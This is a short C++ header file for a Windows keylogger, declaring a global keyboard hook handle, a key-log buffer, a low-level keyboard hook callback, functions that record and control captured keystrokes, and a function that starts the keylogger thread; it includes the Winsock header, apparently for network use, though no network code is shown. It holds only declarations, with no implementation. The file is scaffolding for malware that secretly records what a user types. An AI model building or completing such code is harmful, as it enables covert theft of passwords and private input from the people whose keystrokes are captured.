#pragma once
#include <string>
#include <winsock2.h>

extern HHOOK hHook;
extern std::string KEY_LOG_BUFFER;
std::string keylog_control();
std::string keylog_append(const std::string& key);
void AddKeyToLog(int key_stroke);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void StartKeyloggerThread();